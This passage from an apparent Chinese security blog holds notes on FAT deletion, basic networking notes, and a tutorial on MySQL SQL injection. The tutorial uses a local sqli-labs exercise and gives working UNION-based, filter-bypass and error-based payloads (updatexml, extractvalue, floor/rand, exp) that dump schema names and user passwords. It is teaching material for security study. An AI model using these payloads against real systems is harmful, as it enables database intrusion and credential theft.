<p><strong>2.FAT</strong></p>
<p><strong>3.NTFS</strong></p>
<p>每一个文件的头部、38表示</p>
<p>10表示-基本信息属性、30-名字属性、对应位置</p>
<p>常驻属性和非常驻属性</p>
<p>FAT – File Allocation Table （文件分配表）</p>
<p>NTFS – New Technology File System （新技术文件系统）</p>
<p>FAT删除</p>
<p>1.文件名开头以  HEX E5 </p>
<p>2.删除相应的簇链，簇链设置为0</p>
<p>3.最后4个字节是 0A 00  代表文件大小</p>
<p>再往前的 51 00  代表簇号</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-MYSQL-SQL-BYPASS" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/22/MYSQL-SQL-BYPASS/"
    >MYSQL_SQL_BYPASS</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/22/MYSQL-SQL-BYPASS/" class="article-date">
  <time datetime="2020-04-22T14:26:06.000Z" itemprop="datePublished">2020-04-22</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>知其然，更要知其所以然！ </p>
<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
<p>我们经常用到的几个表</p>
<ol>
<li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
<li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
<li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
</ol>
<p>SCHEMATA: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>

<p>TABLES:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>COLUMNS：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>user 表保存的用户密码 和host等等信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>

<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>

<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
<li><strong>过滤不严格。</strong></li>
<li><strong>数据库配置不当。</strong></li>
<li><strong>转义不当。</strong></li>
</ol>
<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
<ol>
<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
</ol>
<hr>
<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
<p>读取host与user</p>
<p>通过以上信息还能大概判断下是不是站库分离之类的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
<p>同时#被过滤，但 –+ 可以</p>
<p>order by 猜测 列数  —-爆出为3列</p>
<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>可以爆出所有表–emails,referers,uagents,users</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>

<p>可以爆出user表下的所有列—id,username,password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>

<p>爆字段—</p>
<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
<p>总结：group_concat()可以聚合起来，查看更方便</p>
<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>

<p>users表被拦截，可以用以下方法绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>Q1.floor()函数是什么？</p>
<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
<p>Q2.rand(0)是什么意思？</p>
<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>Q3.为什么会出现报错？</p>
<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>

<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>

<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>

<hr>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-计网基础" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/"
    >计网基础</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2020-04-17T12:24:27.000Z" itemprop="datePublished">2020-04-17</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><p><strong>osi七层模型：</strong></p>
<p><strong>物理层-链路层-网络层-运输层-会话层-表示层-应用层</strong></p>
<p>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</p>
<p>但是OSI在市场化方面是失败的—过于复杂等因素</p>
<p><strong>TCP/IP 获得了最广泛的应用–四层体系结构</strong></p>
<p><strong>应用层–运输层–网际层–网络接口层</strong></p>
<p>还有折中的五层体系结构： <strong>物理层–数据链路层–网络层–运输层–应用层</strong></p>
<hr>
<p><strong>实体：</strong>表示任何可发送或接收信息 的硬件或软件进程</p>
<p>同一系统相邻两层的实体进行交互的地方，称为 <strong>服务访问点 SAP (Service Access Point)</strong></p>
<p><strong>PDU（protocol data unit）</strong>每一层使用自己层的协议和别的系统对应层相互通信，交换的信息叫做<strong>协议数据单</strong></p>
<p><strong>• 上三层：message 消息</strong> </p>
<p><strong>• 传输层：segment 数据段</strong></p>
<p><strong>• 网络层：packet 包</strong></p>
<p><strong>• 链路层：frame 帧</strong></p>
<p><strong>• 物理层：bit     比特流</strong></p>
<p>互联网组成 按工作方式划分为以下的两部分： </p>
<p><strong>(1)边缘部分</strong> 所有连接在互联网上的主机用户直接使用，进行通信和资源共享</p>
<p><strong>(2)核心部分</strong> 大量网络和连接网络的设备组成为边缘部分提供连通交换</p>
<p>互联网的边缘部分–两种通信方式 </p>
<p><strong>• 客户–服务器方式</strong>（<strong>C/S 方式）</strong> 即Client/Server方式 </p>
<p><strong>• 对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式</p>
<hr>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h2><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><strong>网际协议IP</strong></h3><p>与 IP 协议配套使用的还有三个协议： </p>
<p><strong>– 地址解析协议 ARP (Address Resolution Protocol)</strong> </p>
<p><strong>– 网际控制报文协议 ICMP (Internet Control Message Protocol)</strong> </p>
<p><strong>– 网际组管理协议 IGMP (Internet Group Management Protocol)</strong></p>
<p><strong>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}</strong> </p>
<p><strong>网络号net-id</strong>，它标志主机（或路由器）所连接到的网络</p>
<p><strong>主机号host-id</strong>，它标志该主机 （或路由器）</p>
<table>
<thead>
<tr>
<th></th>
<th>网络数目</th>
<th>第一个可用的网络号</th>
<th>最后一个课用的网络号</th>
<th>最大的主机数</th>
</tr>
</thead>
<tbody><tr>
<td>A类</td>
<td>126 (2^7-1)</td>
<td>1</td>
<td>126</td>
<td>1600万</td>
</tr>
<tr>
<td>B类</td>
<td>16383  (2^14-1)</td>
<td>128.1</td>
<td>191.255</td>
<td>65534</td>
</tr>
<tr>
<td>C类</td>
<td>2^21 -1</td>
<td>192.0.1</td>
<td>223.255.255</td>
<td>254</td>
</tr>
</tbody></table>
<p> <strong>特殊的IP地址</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中</span></span><br><span class="line"><span class="comment">#而使用这三个网段的计算机要上网必须要通过地址翻译（NAT），将私有地址翻译成公用合法的IP地址</span></span><br><span class="line"><span class="number">10</span>.*.*.*    <span class="number">172.16</span>.*.*    <span class="number">172.31</span>.*.*   <span class="number">192.168</span>.*.*  </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你的主机使用了DHCP功能自动获得一个ip地址，那么当你的DHCP服务器发生故障或响应时间太长而超出系统规定的一个时间，windows系统会为你分配这样一个地址</span></span><br><span class="line"><span class="number">169.254</span>.*.*</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机。如果翻译成人类的语言，应该是这样：“这个房间里的所有人都注意了！”这个地址不能被路由器转发。</span></span><br><span class="line"><span class="number">255.255</span>.<span class="number">255.255</span></span><br></pre></td></tr></table></figure>

<p>在同一个局域网上的主机或路由器 他们IP地址的网络号必须是一样</p>
<p>路由器总是具有<strong>两个或两个以上的IP地址</strong>。 路由器的每一个接口都有一个不同网络号的IP地址</p>
<hr>
<h3 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h3><p>数据链路层的帧 必须使用硬件地址</p>
<p>每一个主机都有一个 ARP 高速缓存(ARP cache) </p>
<p>– 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址 </p>
<p>– 减少网络上的通信量 </p>
<p>• 主机 A 向本网的主机 B 发送 IP 数据报 </p>
<p>根据IP地址查找 ARP 高速缓存 </p>
<p>– 如有，将硬件地址写入 MAC 帧</p>
<p>– 如没有，ARP请求广播，如下图</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/1.png" style="zoom:80%;">

<p>• ARP 是解决<strong>同一个局域网上</strong>的主机或路由器 的 IP 地址和硬件地址的映射问题</p>
<p> • 如果所要找的主机和源主机不在同一个局域网上，那么网关来了</p>
<p> <strong>• 网关-</strong>-网络层以上使用的中间设备，很少用 </p>
<p>​          –路由器的旧称</p>
<p><strong>• 使用 ARP 的四种典型情况</strong></p>
<p> • 发送方是主机，要把IP数据报发送到本网络上的另一个主 机。这时用 ARP 找到目的主机的硬件地址。 </p>
<p>• 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到网关硬件地址。剩下的工作由 网关来完成。 </p>
<p>• 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。</p>
<p>• 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬 件地址。剩下的工作由这个路由器来完成</p>
<hr>
<h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a><strong>划分子网</strong></h3><p>早期IP 地址的设计确实不够合理<br>– 两级的 IP 地址不够灵活<br>– IP 地址空间的利用率有时很低<br>– 路由表太大，网络性能差</p>
<p><strong>划分子网(subnetting)</strong></p>
<p>– 互联网的正式标准协议 </p>
<p>– 在 IP 地址中增加 “子网号字段” subnet-id </p>
<p>– 子网号是借用若干位的主机号 </p>
